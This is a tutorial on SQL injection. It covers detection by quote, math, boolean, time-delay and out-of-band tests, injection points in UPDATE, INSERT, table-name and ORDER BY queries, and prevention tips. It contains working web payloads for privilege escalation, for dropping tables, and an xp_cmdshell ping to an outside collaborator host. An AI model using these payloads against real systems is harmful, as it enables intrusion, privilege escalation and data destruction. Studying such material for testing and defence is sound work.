# How to detect SQL injection vulnerabilities
## 🔍 1. **Using a Single Quote `'` to Detect SQL Injection**

### ✅ Goal:

Find out if the application is directly using your input in an SQL query without proper filtering or sanitization.

### 🧪 Example:

Let’s say there's a product page that takes a `productID` as input:

```

https://example.com/product?id=123

```

  
You change it to:

```

https://example.com/product?id=123'

```

  
### 💡 What Happens Behind the Scenes?


The site might be running a query like this:

```sql

SELECT * FROM products WHERE id = '123'

```


When you inject `'`, it becomes:

```sql

SELECT * FROM products WHERE id = '123''

```


This breaks the syntax — extra quote causes an error.


### 🚨 If Vulnerable:

- You may see an SQL error:  

  `"You have an error in your SQL syntax..."`

- Or a generic error:  

  `"Internal Server Error"`

If this happens, the field is likely vulnerable!


## 🔢 2. **Testing with Math Expressions (`5+5`)**

### ✅ Goal:

See if the input is being used in a numeric context inside SQL.

### 🧪 Example:

Try changing the ID from `123` to a math expression like:

```

https://example.com/product?id=5+5

```

  
Or in SQL-specific syntax:

```

https://example.com/product?id=5%2b5

```

  (Where `%2b` is URL-encoded for `+`)

  
### 💡 What Happens Behind the Scenes?
 
If the app does something like:
 
```sql

SELECT * FROM products WHERE id = 5 + 5

```

  Then it will fetch the item with ID `10`.

If the page shows product ID `10`, then the math was evaluated — meaning SQL is interpreting your input directly.

### 🎯 Why This Works:

Some apps convert inputs into numbers before using them in queries. If they don’t sanitize properly, you can manipulate the logic.

## 🤔 3. **Using Boolean Conditions (`OR 1=1`, `OR 1=2`)**

### ✅ Goal:

Detect **blind SQL injection** — when there are no visible errors but behavior changes based on true/false conditions.

### 🧪 Example:

Try these URLs and compare the results:

✅ True condition:

```

https://example.com/product?id=123 OR 1=1

```

❌ False condition:

```

https://example.com/product?id=123 OR 1=2

```

### 💡 What Happens Behind the Scenes?

The original query might look like:

```sql

SELECT * FROM products WHERE id = 123

```

After injecting:
✅ True:

```sql

SELECT * FROM products WHERE id = 123 OR 1=1

```

This always returns true → shows results

❌ False:

```sql

SELECT * FROM products WHERE id = 123 OR 1=2

```

This only shows results if `id = 123` exists → different behavior

### 📊 How to Spot It:

- One URL loads content normally.

- The other gives a blank page, error, or different result.

- Even subtle differences mean SQL is reacting — **vulnerable!**

## ⏱️ 4. **Triggering Time Delays (`SLEEP()`, `WAITFOR DELAY`)**

### ✅ Goal:

Test for SQL injection when there are **no visible signs** — not even errors or output.

  
### 🧪 Example:

Inject a payload that makes the database pause for a few seconds:

MySQL:

```

https://example.com/product?id=123; SLEEP(10)

```

SQL Server:

```

https://example.com/product?id=123; WAITFOR DELAY '0:0:10'

```
  
PostgreSQL:

```

https://example.com/product?id=123; SELECT pg_sleep(10)

```

### 💡 What Happens Behind the Scenes?

The database runs your injected command and waits before responding. If the response takes longer than usual (like 10 seconds), it means the SQL was executed.

### 🕰️ Why This Works:

Even if nothing appears on the screen, you can **detect SQLi via timing differences**.

## 🌐📡 5. **Using OAST (Out-of-Band) Payloads (e.g., Burp Collaborator)**
### ✅ Goal:

Detect SQL injection when there are **no visible errors or delays** — not even timing.

### 🧪 Example:

Inject a payload that tells the server to make an external request:


MySQL:

```sql

LOAD_FILE('\\\\your-collaborator.burpcollaborator.net\\test.txt')

```


DNS lookup (common across DBs):

```sql

http://your-collaborator.burpcollaborator.net

```

You'd inject it like this:

```

https://example.com/product?id=123'; EXEC xp_cmdshell('ping your-collaborator.burpcollaborator.net')--

```

### 💡 What Happens Behind the Scenes?

- The database tries to connect to a domain you control.
- You use a tool like **Burp Collaborator** to monitor if any requests come in.
- If you get a hit → **SQL injection confirmed!**

### 🛡️ Why This Works:

Sometimes you can't see the effects of SQL injection at all. But if the database reaches out to your server, you know it ran your code.

## 🧠 Summary Table
| Technique | Example Input | Why It Works |
|----------|----------------|---------------|
| `'` | `'` | Breaks SQL syntax – look for errors |
| Math expr | `5+5` | Makes SQL evaluate expressions |
| Boolean | `OR 1=1` / `OR 1=2` | Changes logic – look for behavior difference |
| Delay | `SLEEP(10)` | Triggers time delay – look for slow response |
| OAST | `burpcollaborator.net` | Forces DB to call external server |

## 🧩 Final Tip:

Use **Burp Suite** to automate testing:

- Intercept the request.

- Send it to **Intruder** or **Scanner**.

- Automate payloads like `'`, `OR 1=1`, `SLEEP()` etc.



## 🧠 Continue: SQL Injection Isn’t Just for WHERE Clauses!

Most people learn SQL injection by attacking the `WHERE` clause, like this:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password'
```

But SQL injection can happen **anywhere** in a query — not just in the `WHERE` clause.

Let’s explore how attackers exploit SQL injection in **different parts** of queries and why that’s dangerous.


## 1️⃣ 🔁 SQL Injection in UPDATE Statements

### 💡 Where It Happens:
- In the **values being updated**
- Or in the **WHERE clause**

### 🧪 Example:
Say the app updates user details like this:

```sql
UPDATE users SET email = 'user@example.com' WHERE id = 1
```

You inject into the email field:

```
email = 'hacker@example.com', isAdmin = 1 WHERE id = 1--
```

Resulting query becomes:

```sql
UPDATE users SET email = 'hacker@example.com', isAdmin = 1 WHERE id = 1--' WHERE id = 1
```

### 🎯 What Happened?
- You changed your own account to an admin.
- The `--` comments out the rest of the query so it doesn’t break.

### ⚠️ Why Dangerous?
This lets you **modify sensitive data**, like making yourself an admin or changing someone else's info.

# 2️⃣ ➕ SQL Injection in INSERT Statements

### 💡 Where It Happens:
In the **values being inserted**.

### 🧪 Example:
A registration form inserts new users like this:

```sql
INSERT INTO users (username, email) VALUES ('bob', 'bob@example.com')
```

You inject into the username field:

```
username = bob', 'bob@example.com'); DROP TABLE users;--
```

Resulting query becomes:

```sql
INSERT INTO users (username, email) VALUES ('bob', 'bob@example.com'); DROP TABLE users;--')
```

### 🎯 What Happened?
- You ended the `INSERT` early.
- Then ran a malicious command (`DROP TABLE users`) to delete the whole table!
- The `--` hides the original closing quote so the query still works.

### ⚠️ Why Dangerous?
You can **insert malicious data** or even **delete tables** if the injection is severe enough.


# 3️⃣ 📚 SQL Injection in Table or Column Names

### 💡 Where It Happens:
When developers build dynamic queries using user input for **table names** or **column names**.

### 🧪 Example:
An API might allow selecting from different tables:

```sql
SELECT * FROM [user_table]
```

You change `user_table` to:

```
users; DROP TABLE secrets;--
```

Final query becomes:

```sql
SELECT * FROM users; DROP TABLE secrets;--;
```

### 🎯 What Happened?
- You made the database select from one table, then drop another.
- Again, `--` hides the original syntax to avoid errors.

### ⚠️ Why Dangerous?
Developers often assume table/column names are safe. But if they're user-controlled, you can **run destructive commands**.

# 4️⃣ 📊 SQL Injection in ORDER BY Clause

### 💡 Where It Happens:
In the `ORDER BY` part of a query — often used for sorting search results.

### 🧪 Example:
The app sorts products like this:

```sql
SELECT * FROM products ORDER BY price DESC
```

You inject into the sort parameter:

```
price); DROP TABLE products;--
```

Final query becomes:

```sql
SELECT * FROM products ORDER BY price); DROP TABLE products;-- DESC
```

### 🎯 What Happened?
- You closed the `ORDER BY price)` early.
- Then added a destructive command.
- Used `--` to hide the leftover `DESC`.

### ⚠️ Why Dangerous?
Even parts of the query that seem harmless (like sorting) can be exploited if not properly sanitized.


### 🧠 Summary Table

| Query Part        | Vulnerable Code Example                        | Attack Payload                                 | Result                  |
| ----------------- | ---------------------------------------------- | ---------------------------------------------- | ----------------------- |
| `WHERE` clause    | `SELECT * FROM users WHERE username = 'admin'` | `' OR '1'='1`                                  | Bypass login            |
| `UPDATE` values   | `UPDATE users SET email = 'old' WHERE id=1`    | `'hacker@example.com', isAdmin=1 WHERE id=1--` | Escalate privileges     |
| `INSERT` values   | `INSERT INTO users (name) VALUES ('bob')`      | `'bob'); DROP TABLE users;--`                  | Delete data             |
| Table/Column name | `SELECT * FROM [user_table]`                   | `users; DROP TABLE secrets;--`                 | Destroy DB structure    |
| `ORDER BY`        | `SELECT * FROM products ORDER BY price DESC`   | `price); DROP TABLE products;--`               | Run destructive queries |

## ✅ Tips to Prevent This:

1. **Use parameterized queries / prepared statements** – never directly insert user input into SQL.
2. **Validate inputs** – especially when they control table/column names.
3. **Avoid dynamic SQL** unless absolutely necessary.
4. **Use Web Application Firewalls (WAFs)** as an extra layer of defense.

---


